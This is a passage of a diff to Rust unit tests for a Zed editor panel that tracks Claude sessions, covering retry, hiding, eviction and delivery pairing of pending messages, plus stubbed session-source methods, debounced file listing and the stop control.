+            "/compact keep the decisions",
+        ] {
+            let mut pending_sends = PendingSends::default();
+            let id = pending_sends.remember("7", original, &[]);
+            pending_sends.resolve(id, &Err(anyhow::anyhow!("Zed channel is not loaded")));
+
+            let retried = pending_sends.retry(id, &[]);
+            assert_eq!(
+                retried.as_ref().map(SharedString::as_ref),
+                Some(original),
+                "Retry must re-send the message that failed; expected {original:?}, got {:?}",
+                retried.as_ref().map(SharedString::as_ref)
+            );
+            assert!(
+                pending_sends
+                    .sends
+                    .iter()
+                    .find(|send| send.id == id)
+                    .is_some_and(|send| send.error.is_none()),
+                "a retried row is trying again, so it must not still read as failed"
+            );
+
+            pending_sends.resolve(id, &Err(anyhow::anyhow!("Zed channel is not loaded")));
+            assert_eq!(
+                pending_ids(&pending_sends),
+                vec![id],
+                "a second failure must leave the row to be retried again, not take it down"
+            );
+            assert_eq!(
+                pending_sends.text(id).map(SharedString::as_ref),
+                Some(original),
+                "the text survives every failure; expected {original:?}, got {:?}",
+                pending_sends.text(id).map(SharedString::as_ref)
+            );
+        }
+    }
+
+    #[test]
+    fn a_message_sent_inbox_event_marks_the_pending_send_delivered() {
+        let mut pending_sends = PendingSends::default();
+        let id = pending_sends.remember("7", "hello from zed", &[]);
+        pending_sends.resolve(id, &Ok("0000000000050-0001.json".to_string()));
+
+        let local_now = 1_700_000_000_000;
+        pending_sends.pair_with_channel(
+            &[ChannelInboxEvent::MessageSent {
+                at_ms: 50,
+                outbox_file: "0000000000050-0001.json".to_string(),
+                content_chars: 14,
+            }],
+            local_now,
+        );
+
+        let send = pending_sends
+            .sends
+            .iter()
+            .find(|send| send.id == id)
+            .expect("the send is still waiting for its transcript record");
+        assert_eq!(send.delivered_at_ms, Some(50));
+        // Host at_ms is display-only. The 60 s wait is measured from the local time
+        // this inbox event was observed (here: a reader whose clock is far ahead of 50).
+        assert_eq!(
+            pending_send_note(send, local_now),
+            CHANNEL_DELIVERED_NOTE,
+            "a message the inbox has just reported delivered must read \"delivered to Claude\", \
+             got {:?}",
+            pending_send_note(send, local_now)
+        );
+        assert_eq!(
+            pending_send_note(send, local_now + CHANNEL_WAIT_FOR_TRANSCRIPT_MS),
+            CHANNEL_WAITING_NOTE,
+            "60 s after local observation, with no transcript record, says waiting; got {:?}",
+            pending_send_note(send, local_now + CHANNEL_WAIT_FOR_TRANSCRIPT_MS)
         );
     }
 
     #[test]
-    fn pending_messages_do_not_follow_the_reader_to_another_session() {
+    fn pending_messages_are_hidden_not_dropped_when_the_reader_switches_session() {
         let mut pending_sends = PendingSends::default();
-        pending_sends.remember(7, "for the session I was reading", &[]);
-        let nine = pending_sends.remember(9, "for the session I am reading now", &[]);
+        pending_sends.remember("7", "for the session I was reading", &[]);
+        let nine = pending_sends.remember("9", "for the session I am reading now", &[]);
         assert_eq!(pending_ids(&pending_sends).len(), 2);
 
-        pending_sends.retain_session(Some(9));
         assert_eq!(
-            pending_ids(&pending_sends),
-            vec![nine],
-            "a pending message belongs to the conversation it was sent to"
+            pending_texts(&pending_sends.entries_for(Some("9"))),
+            vec![SharedString::from("for the session I am reading now")],
+            "the renderer shows only the selected session's rows"
+        );
+        assert_eq!(
+            pending_ids(&pending_sends).len(),
+            2,
+            "the backing collection still holds the other session's row"
+        );
+        assert!(
+            pending_ids(&pending_sends).contains(&nine),
+            "the selected session's row stays in the backing collection too"
         );
 
-        pending_sends.retain_session(None);
+        assert_eq!(
+            pending_texts(&pending_sends.entries_for(Some("7"))),
+            vec![SharedString::from("for the session I was reading")],
+            "switching back shows the hidden row again"
+        );
+        assert_eq!(pending_ids(&pending_sends).len(), 2);
+    }
+
+    #[test]
+    fn a_failed_row_hides_when_switching_session_and_reappears_with_its_text() {
+        let mut pending_sends = PendingSends::default();
+        let failed = pending_sends.remember("session-a", "keep this text", &[]);
+        pending_sends.resolve(failed, &Err(anyhow::anyhow!("offline")));
+        pending_sends.remember("session-b", "the other conversation", &[]);
+
+        assert_eq!(
+            pending_texts(&pending_sends.entries_for(Some("session-b"))),
+            vec![SharedString::from("the other conversation")],
+            "a Failed row is not rendered under a different session"
+        );
+        assert_eq!(
+            pending_ids(&pending_sends).len(),
+            2,
+            "switching session must not drop the Failed row"
+        );
+        assert_eq!(
+            pending_texts(&pending_sends.entries_for(Some("session-a"))),
+            vec![SharedString::from("keep this text")],
+            "switching back shows the Failed row with its text intact"
+        );
+    }
+
+    #[test]
+    fn dismiss_ended_hides_failed_rows_until_the_session_is_reselected() {
+        let mut pending_sends = PendingSends::default();
+        let failed = pending_sends.remember("session-a", "still mine", &[]);
+        pending_sends.resolve(failed, &Err(anyhow::anyhow!("offline")));
+
         assert!(
-            pending_sends.is_empty(),
-            "with no session selected there is no conversation to draw it in, {:?} left",
-            pending_ids(&pending_sends)
+            pending_sends.entries_for(None).is_empty(),
+            "dismiss_ended leaves no session selected, so nothing is drawn"
+        );
+        assert_eq!(
+            pending_ids(&pending_sends),
+            vec![failed],
+            "dismiss_ended must not drop the row"
+        );
+        assert_eq!(
+            pending_texts(&pending_sends.entries_for(Some("session-a"))),
+            vec![SharedString::from("still mine")],
+            "reselecting the session shows the row again"
+        );
+    }
+
+    #[test]
+    fn closing_a_failed_row_removes_only_that_row() {
+        let mut pending_sends = PendingSends::default();
+        let first = pending_sends.remember("7", "first failed", &[]);
+        let second = pending_sends.remember("7", "second failed", &[]);
+        pending_sends.resolve(first, &Err(anyhow::anyhow!("offline")));
+        pending_sends.resolve(second, &Err(anyhow::anyhow!("offline")));
+
+        pending_sends.dismiss(first);
+        assert_eq!(
+            pending_ids(&pending_sends),
+            vec![second],
+            "the close control takes down only the Failed row it sits on"
+        );
+        assert_eq!(
+            pending_texts(&pending_sends.entries_for(Some("7"))),
+            vec![SharedString::from("second failed")]
+        );
+    }
+
+    #[test]
+    fn pairing_only_considers_the_selected_sessions_rows() {
+        let echo = entries_of(&[&user_message_line("u", "hello from both")]);
+        let mut pending_sends = PendingSends::default();
+        pending_sends.remember("session-a", "hello from both", &[]);
+        let session_b = pending_sends.remember("session-b", "hello from both", &[]);
+
+        pending_sends.pair_with_session(&echo, "session-a");
+        assert_eq!(
+            pending_ids(&pending_sends),
+            vec![session_b],
+            "a transcript echo in A must not take down B's in-flight row"
+        );
+        assert!(
+            pending_sends.holds_text("hello from both", Some("session-b")),
+            "B's in-flight text still occupies B's queue slot"
+        );
+        assert!(
+            !pending_sends.holds_text("hello from both", Some("session-a")),
+            "A's paired-away send must not hide A's queue entry"
+        );
+
+        pending_sends.resolve(session_b, &Ok("0000000000001-0001.json".to_string()));
+        pending_sends.pair_with_channel_for(
+            &[ChannelInboxEvent::MessageSent {
+                at_ms: 50,
+                outbox_file: "0000000000001-0001.json".to_string(),
+                content_chars: 14,
+            }],
+            1_700_000_000_000,
+            "session-a",
+        );
+        let send_b = pending_sends
+            .sends
+            .iter()
+            .find(|send| send.id == session_b)
+            .expect("B's send is still waiting");
+        assert_eq!(
+            send_b.delivered_at_ms, None,
+            "A's inbox must not mark B's outbox file delivered"
+        );
+
+        pending_sends.pair_with_channel_for(
+            &[ChannelInboxEvent::MessageSent {
+                at_ms: 50,
+                outbox_file: "0000000000001-0001.json".to_string(),
+                content_chars: 14,
+            }],
+            1_700_000_000_000,
+            "session-b",
+        );
+        let send_b = pending_sends
+            .sends
+            .iter()
+            .find(|send| send.id == session_b)
+            .expect("B's send is still waiting for its transcript record");
+        assert_eq!(send_b.delivered_at_ms, Some(50));
+    }
+
+    #[test]
+    fn the_finished_row_bound_evicts_oldest_finished_and_never_in_flight() {
+        let mut under_the_bound = PendingSends::default();
+        for session in ["session-a", "session-b", "session-c"] {
+            for index in 0..5 {
+                let id =
+                    under_the_bound.remember(session, &format!("{session}-failed-{index}"), &[]);
+                under_the_bound.resolve(id, &Err(anyhow::anyhow!("offline")));
+            }
+        }
+        assert_eq!(
+            under_the_bound.sends.len(),
+            15,
+            "3 sessions × 5 failed rows are under the bound and must lose nothing"
+        );
+
+        let mut in_flight_only = PendingSends::default();
+        for index in 0..51 {
+            in_flight_only.remember("session-a", &format!("in-flight-{index}"), &[]);
+        }
+        assert_eq!(
+            in_flight_only.sends.len(),
+            51,
+            "in-flight rows are not counted, so 51 of them coexist"
+        );
+
+        let mut pending_sends = PendingSends::default();
+        for index in 0..60 {
+            let id = pending_sends.remember("session-a", &format!("finished-{index}"), &[]);
+            pending_sends.resolve(id, &Err(anyhow::anyhow!("offline")));
+        }
+        let in_flight_ids: Vec<u64> = (0..3)
+            .map(|index| pending_sends.remember("session-a", &format!("in-flight-{index}"), &[]))
+            .collect();
+
+        let finished_texts: Vec<String> = pending_sends
+            .sends
+            .iter()
+            .filter(|send| send.error.is_some())
+            .map(|send| send.text.to_string())
+            .collect();
+        let in_flight_left: Vec<u64> = pending_sends
+            .sends
+            .iter()
+            .filter(|send| send.error.is_none())
+            .map(|send| send.id)
+            .collect();
+        assert_eq!(finished_texts.len(), 50);
+        assert_eq!(in_flight_left, in_flight_ids);
+        assert_eq!(
+            finished_texts.first().map(String::as_str),
+            Some("finished-10")
+        );
+        assert!(
+            !finished_texts.iter().any(|text| text == "finished-0"),
+            "the 10 evicted rows are the oldest finished; got {finished_texts:?}"
+        );
+        assert_eq!(
+            finished_texts.last().map(String::as_str),
+            Some("finished-59")
+        );
+    }
+
+    /// A row of a session that is still live or still in `ended` must not be failed by
+    /// the gone-session guard, even across many applications — that is the legal input
+    /// the guard could wrongly kill. A session that is neither is marked failed so the
+    /// finished bound covers it; a row that was already finished is left alone.
+    #[test]
+    fn in_flight_rows_of_a_gone_session_are_marked_failed_and_live_or_ended_ones_are_not() {
+        let mut pending_sends = PendingSends::default();
+        let live = pending_sends.remember("live-session", "hidden but live", &[]);
+        let ended = pending_sends.remember("ended-session", "still listed as ended", &[]);
+        let gone = pending_sends.remember("gone-session", "never coming back", &[]);
+        let already_failed = pending_sends.remember("gone-session", "already failed", &[]);
+        pending_sends.resolve(already_failed, &Err(anyhow::anyhow!("offline")));
+        let original_error = pending_sends
+            .sends
+            .iter()
+            .find(|send| send.id == already_failed)
+            .expect("the already-failed row is there")
+            .error
+            .clone();
+
+        for _ in 0..10 {
+            pending_sends.fail_in_flight_of_unknown_sessions(["live-session", "ended-session"]);
+        }
+        pending_sends.evict_finished_over_bound();
+
+        let send_live = pending_sends
+            .sends
+            .iter()
+            .find(|send| send.id == live)
+            .expect("the live session's in-flight row must survive");
+        assert_eq!(send_live.error, None, "a hidden-but-live session is legal");
+        let send_ended = pending_sends
+            .sends
+            .iter()
+            .find(|send| send.id == ended)
+            .expect("the ended session's in-flight row must survive");
+        assert_eq!(send_ended.error, None, "a session still in ended is legal");
+        let send_gone = pending_sends
+            .sends
+            .iter()
+            .find(|send| send.id == gone)
+            .expect("the gone session's row is kept as a finished row");
+        assert_eq!(
+            send_gone.error.as_deref(),
+            Some(SESSION_ENDED_BEFORE_ARRIVAL)
+        );
+        let send_already_failed = pending_sends
+            .sends
+            .iter()
+            .find(|send| send.id == already_failed)
+            .expect("the already-failed row is left in place");
+        assert_eq!(
+            send_already_failed.error, original_error,
+            "finished rows are not rewritten by the gone-session guard"
+        );
+    }
+
+    /// Applying (A→B) then (B→C) in order takes rows keyed A all the way to C.
+    #[test]
+    fn rebind_applies_a_chain_of_clears_in_order() {
+        let mut pending_sends = PendingSends::default();
+        let id = pending_sends.remember("session-a", "follow the chain", &[]);
+        pending_sends.rebind("session-a", "session-b");
+        pending_sends.rebind("session-b", "session-c");
+        let send = pending_sends
+            .sends
+            .iter()
+            .find(|send| send.id == id)
+            .expect("the row is still there");
+        assert_eq!(
+            send.session_id.as_str(),
+            "session-c",
+            "rows keyed A must land on C after A→B then B→C"
         );
     }
 
     #[test]
     fn dismissing_one_pending_message_leaves_the_others() {
         let mut pending_sends = PendingSends::default();
-        let first = pending_sends.remember(7, "same text", &[]);
-        let second = pending_sends.remember(7, "same text", &[]);
-        let third = pending_sends.remember(7, "another message", &[]);
+        let first = pending_sends.remember("7", "same text", &[]);
+        let second = pending_sends.remember("7", "same text", &[]);
+        let third = pending_sends.remember("7", "another message", &[]);
         assert_eq!(pending_ids(&pending_sends), vec![first, second, third]);
 
         pending_sends.dismiss(second);
@@ -12136,17 +16310,40 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
     /// nothing else about a transcript file takes part in that.
     struct ScriptedSource {
         home_directory: PathBuf,
+        sessions: Mutex<Vec<RegisteredSession>>,
         session_lines: Mutex<Vec<String>>,
         agent_lines: Mutex<Vec<String>>,
+        file_list_requests: Mutex<Vec<(PathBuf, String)>>,
+        slash_command_roots: Mutex<Vec<Option<PathBuf>>>,
+        /// What a read of a sent file hands back, for the tests that draw one.
+        attachment_bytes: Vec<u8>,
     }
 
     impl ScriptedSource {
         fn new(session_lines: &[String], agent_lines: &[String]) -> Self {
             Self {
                 home_directory: PathBuf::from("/scripted-home"),
+                sessions: Mutex::new(vec![scripted_registered_session()]),
                 session_lines: Mutex::new(session_lines.to_vec()),
                 agent_lines: Mutex::new(agent_lines.to_vec()),
+                file_list_requests: Mutex::new(Vec::new()),
+                slash_command_roots: Mutex::new(Vec::new()),
+                attachment_bytes: Vec::new(),
             }
+        }
+
+        fn with_sessions(self, sessions: Vec<RegisteredSession>) -> Self {
+            *self.sessions.lock().expect("setting scripted sessions") = sessions;
+            self
+        }
+
+        fn set_sessions(&self, sessions: Vec<RegisteredSession>) {
+            *self.sessions.lock().expect("replacing scripted sessions") = sessions;
+        }
+
+        fn with_attachment(mut self, bytes: Vec<u8>) -> Self {
+            self.attachment_bytes = bytes;
+            self
         }
 
         /// Hands over whatever has not been delivered yet, so that the poll's later turns
@@ -12196,14 +16393,20 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             _project_root: Option<PathBuf>,
         ) -> Task<anyhow::Result<SessionListing>> {
             Task::ready(Ok(SessionListing {
-                sessions: vec![SessionSummary {
-                    session: scripted_registered_session(),
-                    transcript_path: Some(self.home_directory.join("session.jsonl")),
-                    // Read from the end of a real transcript, which these tests write by
-                    // hand and never through that reader.
-                    spend: None,
-                }],
+                sessions: self
+                    .sessions
+                    .lock()
+                    .expect("reading scripted sessions")
+                    .iter()
+                    .cloned()
+                    .map(|session| SessionSummary {
+                        session,
+                        transcript_path: Some(self.home_directory.join("session.jsonl")),
+                        spend: None,
+                    })
+                    .collect(),
                 home_directory: self.home_directory.clone(),
+                liveness_unavailable_reason: None,
             }))
         }
 
@@ -12252,34 +16455,47 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             let mut subagents_by_session = HashMap::default();
             for session_id in session_ids {
                 let listed = self.list_subagents(session_id.clone());
-                subagents_by_session.insert(
-                    session_id,
-                    smol::block_on(listed).unwrap_or_default(),
-                );
+                subagents_by_session.insert(session_id, smol::block_on(listed).unwrap_or_default());
             }
             Task::ready(Ok(subagents_by_session))
         }
 
-        fn pending_question(
+        fn tail_events(
             &self,
             _session_id: String,
-        ) -> Task<anyhow::Result<crate::session_source::QuestionState>> {
-            Task::ready(Ok(crate::session_source::QuestionState {
-                question: None,
-                hook_installed: false,
-                live_message: None,
+            state: TailState,
+        ) -> Task<anyhow::Result<TailProgress>> {
+            Task::ready(Ok(TailProgress {
+                path: None,
+                start_offset: state.offset,
+                offset: state.offset,
+                pending: state.pending,
+                lines: Vec::new(),
+                restarted: false,
             }))
         }
 
-        fn install_question_hook(&self) -> Task<anyhow::Result<Option<PathBuf>>> {
+        fn read_status(&self, _session_id: String) -> Task<anyhow::Result<Option<String>>> {
             Task::ready(Ok(None))
+        }
+
+        fn install_hooks(&self) -> Task<anyhow::Result<HookInstallOutcome>> {
+            Task::ready(Ok(HookInstallOutcome::AlreadyCurrent))
+        }
+
+        fn hooks_installed(&self) -> Task<anyhow::Result<bool>> {
+            Task::ready(Ok(false))
         }
 
         fn list_session_files(
             &self,
-            _directory: PathBuf,
-            _query: String,
+            directory: PathBuf,
+            query: String,
         ) -> Task<anyhow::Result<Vec<String>>> {
+            self.file_list_requests
+                .lock()
+                .expect("recording a file listing")
+                .push((directory, query));
             Task::ready(Ok(Vec::new()))
         }
 
@@ -12292,8 +16508,12 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         }
         fn list_slash_commands(
             &self,
-            _project_root: Option<PathBuf>,
+            project_root: Option<PathBuf>,
         ) -> Task<anyhow::Result<Vec<SlashCommand>>> {
+            self.slash_command_roots
+                .lock()
+                .expect("recording a slash-command listing")
+                .push(project_root);
             Task::ready(Ok(Vec::new()))
         }
 
@@ -12318,18 +16538,71 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
             }))
         }
 
-        fn send_input(
+        fn read_attachment(
             &self,
-            _pane_target: String,
-            _input: SessionInput,
-        ) -> Task<anyhow::Result<()>> {
+            _session_id: String,
+            _path: PathBuf,
+            _max_bytes: u64,
+        ) -> Task<anyhow::Result<FileContents>> {
+            Task::ready(Ok(FileContents {
+                bytes: self.attachment_bytes.clone(),
+                truncated: false,
+            }))
+        }
+
+        fn channel_status(&self, _claude_pid: u32) -> Task<anyhow::Result<ChannelStatus>> {
+            Task::ready(Ok(ChannelStatus {
+                live: false,
+                heartbeat_at_ms: None,
+                server_pid: None,
+                features: Vec::new(),
+            }))
+        }
+
+        fn channel_send_message(
+            &self,
+            _claude_pid: u32,
+            _content: String,
+        ) -> Task<anyhow::Result<String>> {
             Task::ready(Err(anyhow::anyhow!(
                 "nothing in these tests may reach a session"
             )))
         }
 
-        fn capture_pane(&self, _pane_target: String) -> Task<anyhow::Result<String>> {
-            Task::ready(Ok(String::new()))
+        fn channel_interrupt(
+            &self,
+            _claude_pid: u32,
+            _reason: String,
+        ) -> Task<anyhow::Result<String>> {
+            Task::ready(Err(anyhow::anyhow!(
+                "nothing in these tests may reach a session"
+            )))
+        }
+
+        fn channel_answer_permission(
+            &self,
+            _claude_pid: u32,
+            _request_id: String,
+            _allow: bool,
+        ) -> Task<anyhow::Result<String>> {
+            Task::ready(Err(anyhow::anyhow!(
+                "nothing in these tests may reach a session"
+            )))
+        }
+
+        fn tail_channel_inbox(
+            &self,
+            _claude_pid: u32,
+            state: TailState,
+        ) -> Task<anyhow::Result<TailProgress>> {
+            Task::ready(Ok(TailProgress {
+                path: None,
+                start_offset: state.offset,
+                offset: state.offset,
+                pending: state.pending,
+                lines: Vec::new(),
+                restarted: false,
+            }))
         }
     }
 
@@ -12355,14 +16628,22 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         agent_lines: &[String],
         cx: &mut gpui::TestAppContext,
     ) -> Entity<ClaudeSessionsPanel> {
+        scripted_panel_over(
+            Arc::new(ScriptedSource::new(session_lines, agent_lines)),
+            cx,
+        )
+    }
+
+    fn scripted_panel_over(
+        source: Arc<dyn SessionSource>,
+        cx: &mut gpui::TestAppContext,
+    ) -> Entity<ClaudeSessionsPanel> {
         cx.update(|cx| {
             let settings_store = settings::SettingsStore::test(cx);
             cx.set_global(settings_store);
             theme::init(theme::LoadThemes::JustBase, cx);
         });
 
-        let source: Arc<dyn SessionSource> =
-            Arc::new(ScriptedSource::new(session_lines, agent_lines));
         let window = cx.add_window(|_window, _cx| NoUi);
         window
             .update(cx, |_, window, cx| {
@@ -12383,31 +16664,43 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
                     let editor_subscription = cx.subscribe(
                         &message_editor,
                         |this: &mut ClaudeSessionsPanel, _, event, cx| {
-                            if matches!(event, EditorEvent::BufferEdited) {
-                                this.list_files_for_mention(cx);
-                            }
+                            this.handle_message_editor_event(event, cx);
                         },
                     );
 
                     ClaudeSessionsPanel {
                         history_index: None,
-                        quit_armed: false,
-                        ticked: None,
-                        typing_answer_for: None,
+                        question_ticks: HashSet::default(),
+                        ticked_question: None,
+                        permission_answered: false,
+                        permission_answered_for: None,
+                        slash_send_note: None,
                         opened_input_for_question: None,
                         live_message_scroll: ScrollHandle::new(),
                         live_message_length: 0,
+                        live_message_markdown_key: None,
+                        live_message_identity: None,
+                        live_message_height: px(160.),
+                        live_message_drag: None,
+                        now_row_expanded: false,
+                        interrupt_sent_at_ms: None,
+                        stop_armed_until_ms: None,
+                        lifecycle_note: None,
+                        _lifecycle_command: Task::ready(()),
                         file_matches: Vec::new(),
                         file_matches_for: None,
+                        file_query: None,
                         file_highlight: 0,
                         dismissed_file_menu_for: None,
                         _listing_files: Task::ready(()),
                         _pasting: Task::ready(()),
+                        paste_error: None,
                         slash_highlight: 0,
                         dismissed_slash_menu_for: None,
                         slash_commands: Vec::new(),
+                        slash_commands_for: None,
+                        slash_commands_fresh: false,
                         _listing_slash_commands: Task::ready(()),
-                        _answering: Task::ready(()),
                         hook_install_note: None,
                         _installing_hook: Task::ready(()),
                         workspace: WeakEntity::new_invalid(),
@@ -12418,12 +16711,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
                         message_editor,
                         project_root: None,
                         in_pane: false,
-                        pane_expanded: true,
-                        terminal: None,
-                        terminal_process_id: None,
-                        terminal_height: DEFAULT_TERMINAL_HEIGHT,
                         input_expanded: false,
-                        _terminal_attach: Task::ready(()),
                         entries: Vec::new(),
                         pending_sends: PendingSends::default(),
                         activity: Activity::Idle,
@@ -12444,6 +16732,11 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
                         overwrites_dropped: 0,
                         loaded_outputs: HashMap::default(),
                         output_loads: HashMap::default(),
+                        loaded_attachments: HashMap::default(),
+                        forced_attachment_loads: HashSet::default(),
+                        dispatch_prompts: HashMap::default(),
+                        patched_calls: HashSet::default(),
+                        attachment_loads: HashMap::default(),
                         _store_subscription: store_subscription,
                         _editor_subscription: editor_subscription,
                     }
@@ -12478,7 +16771,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         let store = cx.update(|cx| {
             cx.new(|cx| {
                 let mut store = ClaudeSessionStore::new(source.clone(), None, cx);
-                store.select(SCRIPTED_PROCESS_ID, cx);
+                store.select(SCRIPTED_SESSION_ID, cx);
                 store
             })
         });
@@ -12491,7 +16784,7 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         let (listed, selected, transcript_path) = store.read_with(cx, |store, _| {
             (
                 store.sessions().len(),
-                store.selected(),
+                store.selected().map(str::to_string),
                 store.transcript_path().map(Path::to_path_buf),
             )
         });
@@ -12502,8 +16795,8 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         );
         assert_eq!(
             selected,
-            Some(SCRIPTED_PROCESS_ID),
-            "the selection made before the scan must survive it; expected Some({SCRIPTED_PROCESS_ID}), got {selected:?}"
+            Some(SCRIPTED_SESSION_ID.to_string()),
+            "the selection made before the scan must survive it; expected Some({SCRIPTED_SESSION_ID}), got {selected:?}"
         );
         assert!(
             transcript_path.is_some(),
@@ -12518,65 +16811,288 @@ Enter to select · ↑/↓ to navigate · Esc to cancel";
         let panel = scripted_panel(&[], &[], cx);
         let actual = panel.update(cx, |panel, _cx| {
             panel.history_index = Some(3);
-            panel.quit_armed = true;
-            let mut ticked_options = HashSet::default();
-            ticked_options.insert(0);
-            panel.ticked = Some(TickedAnswer {
-                tool_use_id: "call-from-the-old-conversation".into(),
-                question_index: 1,
-                ticked: ticked_options,
-            });
-            panel.typing_answer_for = Some("call-from-the-old-conversation".into());
+            panel.question_ticks.insert((0, 1));
+            panel.permission_answered = true;
+            panel.slash_send_note = Some(SharedString::from("note from the old conversation"));
 
             panel.show_the_newest_of_another_conversation();
             (
                 panel.history_index,
-                panel.quit_armed,
-                panel.ticked.is_some(),
-                panel.typing_answer_for.is_some(),
+                panel.question_ticks.is_empty(),
+                panel.permission_answered,
+                panel.slash_send_note.is_none(),
             )
         });
 
         assert_eq!(
             actual,
-            (None, false, false, false),
-            "all state aimed at the old conversation must be cleared; expected (None, false, false, false), got {actual:?}"
+            (None, true, false, true),
+            "all state aimed at the old conversation must be cleared; expected (None, true, false, true), got {actual:?}"
         );
     }
 
     #[gpui::test]
-    async fn switching_conversations_cancels_an_answer_sequence_in_flight(
+    async fn selection_change_clears_menu_state_and_lists_commands_in_the_new_cwd(
         cx: &mut gpui::TestAppContext,
     ) {
-        let completed = Arc::new(std::sync::atomic::AtomicBool::new(false));
-        let _panel = panel_with_answer_task(&completed, cx);
+        let mut first = scripted_registered_session();
+        first.session_id = "first-session".to_string();
+        first.process_id = 41;
+        first.working_directory = PathBuf::from("/work/first");
+        let mut second = scripted_registered_session();
+        second.session_id = "second-session".to_string();
+        second.process_id = 42;
+        second.working_directory = PathBuf::from("/work/second");
+        let source = Arc::new(
+            ScriptedSource::new(&[], &[]).with_sessions(vec![first.clone(), second.clone()]),
+        );
+        let panel = scripted_panel_over(source.clone(), cx);
+        cx.executor().advance_clock(A_FEW_POLLS);
         cx.run_until_parked();
-        cx.executor().advance_clock(ANSWER_KEY_INTERVAL * 2);
+        panel.update(cx, |panel, cx| {
+            panel.select_session(first.session_id.clone(), cx)
+        });
         cx.run_until_parked();
 
-        let actual = completed.load(std::sync::atomic::Ordering::SeqCst);
+        panel.update(cx, |panel, cx| {
+            panel.file_matches = vec![SharedString::from("old.rs")];
+            panel.file_matches_for = Some("old".to_string());
+            panel.dismissed_file_menu_for = Some("@old".to_string());
+            panel.dismissed_slash_menu_for = Some("/old".to_string());
+            panel.select_session(second.session_id.clone(), cx);
+        });
+        cx.run_until_parked();
+
+        panel.read_with(cx, |panel, _| {
+            assert!(panel.file_matches.is_empty());
+            assert_eq!(panel.file_matches_for, None);
+            assert_eq!(panel.dismissed_file_menu_for, None);
+            assert_eq!(panel.dismissed_slash_menu_for, None);
+        });
+        let roots = source
+            .slash_command_roots
+            .lock()
+            .expect("reading slash-command roots");
         assert_eq!(
-            actual, false,
-            "the answer task belongs to the old conversation; expected completed=false, got completed={actual}"
+            roots.last().and_then(Option::as_deref),
+            Some(second.working_directory.as_path()),
+            "the new session's cwd, not the Zed worktree, is the slash-command root"
         );
     }
 
-    fn panel_with_answer_task(
-        completed: &Arc<std::sync::atomic::AtomicBool>,
+    #[gpui::test]
+    async fn file_listing_is_debounced_to_the_last_of_three_quick_queries(
         cx: &mut gpui::TestAppContext,
-    ) -> Entity<ClaudeSessionsPanel> {
+    ) {
+        let source = Arc::new(ScriptedSource::new(&[], &[]));
+        let panel = scripted_panel_over(source.clone(), cx);
+        read_the_scripted_session(&panel, cx);
+
+        panel.update(cx, |panel, cx| {
+            panel.file_matches = vec![
+                SharedString::from("src/session_store.rs"),
+                SharedString::from("src/session_source.rs"),
+            ];
+            assert_eq!(matching_files(&panel.file_matches, "session_s").len(), 2);
+            panel.list_files_for_query(Some("s".to_string()), cx);
+            panel.list_files_for_query(Some("se".to_string()), cx);
+            panel.list_files_for_query(Some("session_s".to_string()), cx);
+        });
+        cx.executor()
+            .advance_clock(FILE_LIST_DEBOUNCE.saturating_sub(Duration::from_millis(1)));
+        cx.run_until_parked();
+        assert!(
+            source
+                .file_list_requests
+                .lock()
+                .expect("reading file-list requests")
+                .is_empty(),
+            "no host listing is issued before the debounce expires"
+        );
+
+        cx.executor().advance_clock(Duration::from_millis(1));
+        cx.run_until_parked();
+        let requests = source
+            .file_list_requests
+            .lock()
+            .expect("reading file-list requests");
+        assert_eq!(requests.len(), 1);
+        assert_eq!(requests[0].1, "session_s");
+    }
+
+    #[gpui::test]
+    async fn paste_error_has_its_own_state_and_typing_clears_it(cx: &mut gpui::TestAppContext) {
         let panel = scripted_panel(&[], &[], cx);
         panel.update(cx, |panel, cx| {
-            panel._answering = cx.spawn({
-                let completed = completed.clone();
-                async move |_, cx| {
-                    cx.background_executor().timer(ANSWER_KEY_INTERVAL).await;
-                    completed.store(true, std::sync::atomic::Ordering::SeqCst);
-                }
-            });
-            panel.show_the_newest_of_another_conversation();
+            panel.paste_error = Some(SharedString::from("Pasting the image: too large"));
+            assert!(
+                panel.paste_error.is_some(),
+                "the input has an error line to render"
+            );
+            assert_eq!(panel.hook_install_note, None);
+            panel.handle_message_editor_event(&EditorEvent::BufferEdited, cx);
+            assert_eq!(
+                panel.paste_error, None,
+                "typing clears only the paste error line"
+            );
         });
-        panel
+    }
+
+    #[gpui::test]
+    async fn the_stop_control_is_disabled_while_idle(cx: &mut gpui::TestAppContext) {
+        let panel = scripted_panel(&[], &[], cx);
+        let (can_interrupt, reason) = panel.update(cx, |panel, cx| {
+            let store = panel.store.read(cx);
+            (store.can_interrupt(), store.interrupt_disabled_reason())
+        });
+        assert!(
+            !can_interrupt,
+            "Stop stays disabled while the session is idle"
+        );
+        assert!(
+            reason.is_some(),
+            "the disabled Stop control must explain why"
+        );
+    }
+
+    fn sample_ended_session(bridge: bool, tmux: bool) -> EndedSession {
+        EndedSession {
+            session_id: "ended-session".to_string(),
+            name: Some("ended".to_string()),
+            ai_title: None,
+            cwd: PathBuf::from("/tmp/project"),
+            tmux: tmux.then(|| "work:@0.%1".to_string()),
+            bridge_session_id: bridge.then(|| "bridge-id".to_string()),
+            transcript_path: None,
+            last_seen_ms: 0,
+            ended_reason: EndedReason::ProcessGone,
+        }
+    }
+
+    fn sample_background_session() -> LiveSession {
+        LiveSession {
+            session: scripted_registered_session(),
+            background: true,
+            agent_id: Some("a1b2".to_string()),
+            state: Some("working".to_string()),
+            waiting_for: None,
+        }
+    }
+
+    #[test]
+    fn an_ended_row_offers_resume_open_in_claude_ai_and_dismiss() {
+        assert_eq!(
+            ClaudeSessionsPanel::ended_row_action_labels(&sample_ended_session(true, false)),
+            vec!["Resume", "Open in claude.ai", "Dismiss"]
+        );
+        assert_eq!(
+            ClaudeSessionsPanel::ended_row_action_labels(&sample_ended_session(false, true)),
+            vec!["Resume", "Open in tmux", "Dismiss"]
+        );
+    }
+
+    /// The terminal is opened on one string a shell reads, and on a remote project the id
+    /// in that string is the host's answer rather than this machine's.
+    #[test]
